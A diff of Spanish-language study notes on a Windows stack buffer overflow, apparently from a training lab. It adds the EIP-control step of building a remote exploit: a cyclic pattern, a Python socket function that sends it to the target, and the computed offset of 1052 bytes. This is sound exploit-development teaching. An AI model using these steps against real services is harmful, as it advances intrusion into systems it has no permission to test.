@@ -618,20 +618,35 @@ Fuzzing 1500 bytes
 
 Una vez que el programa falla y `EIP`se sobrescribe, sabemos que la última cantidad de bytes que enviamos es lo que hizo que el programa fallara y que el programa es vulnerable a un desbordamiento de búfer.
 
-
-
-
 ## Construyendo un exploit remoto
 
+### Control de EIP
 
+Comenzaremos creando un patrón único `2000` de bytes de longitud, utilizando `ERC --pattern c 2000` como hicimos anteriormente:
 
+![](../../Images/Pasted%20image%2020240925165950.png)
 
+Ahora comenzamos a escribir nuestra `eip_offset()` función. Agregaremos nuestra `pattern` variable como con el patrón `Ascii` en el `Pattern_Create_1.txt`archivo creado en nuestro escritorio, como hicimos con nuestro exploit anterior. Después de eso, para enviar nuestro patrón, podemos usar el mismo código que usamos para fuzzear el puerto:
 
+```python
+def eip_offset():
+    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
+                    ...SNIP...
+                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")
 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(pattern)
+    s.close()
 
+eip_offset()
+```
 
+Una vez que nuestra `eip_offset()` función esté lista, podemos reiniciar nuestro programa `x32dbg` y ejecutar nuestro código, y nuestro programa debería bloquearse y deberíamos ver `EIP` sobrescrito con nuestro patrón como `316A4230`:
 
+![](../../Images/Pasted%20image%2020240925170022.png)
 
+Ahora podemos usar `ERC --pattern o 1jB0` para calcular el desplazamiento exacto, que se encuentra en `1052`bytes:
 
 
 
